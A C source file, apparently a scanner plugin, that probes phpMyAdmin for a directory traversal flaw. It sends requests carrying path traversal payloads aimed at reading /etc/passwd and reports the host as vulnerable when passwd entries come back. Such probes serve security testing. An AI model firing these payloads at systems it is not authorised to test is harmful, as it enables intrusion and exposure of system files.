/* http-phpmyadmin-dir-traversal - phpMyAdmin path traversal probe. */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    static const char *paths[] = {
        "/phpmyadmin/index.php?lang=../../../../etc/passwd",
        "/phpmyadmin/index.php?lang=../../../../etc/passwd%00",
        "/phpmyadmin/index.php?theme=../../../../etc/passwd",
        "/phpMyAdmin/index.php?lang=../../../../etc/passwd",
        "/phpmyadmin/scripts/setup.php"
    };
    char resp[8192];
    const char *body;
    size_t i;

    if (!ar_valid(ctx)) {
        return 1;
    }
    for (i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
        int n = ar_http_get(ctx, paths[i], resp, sizeof(resp));
        if (n <= 0) {
            continue;
        }
        body = ar_http_body(resp);
        if (strstr(body, "root:x:") != NULL ||
            strstr(body, "root:*:") != NULL ||
            strstr(body, "daemon:x:") != NULL) {
            ar_out(ctx, "VULNERABLE: phpMyAdmin directory traversal at %s",
                   paths[i]);
            return 0;
        }
        if (strstr(body, "phpMyAdmin") != NULL &&
            ar_http_status(resp) == 200) {
            ar_out(ctx, "phpMyAdmin detected; traversal not confirmed");
            return 0;
        }
    }
    ar_out(ctx, "not vulnerable: phpMyAdmin directory traversal not confirmed");
    return 0;
}
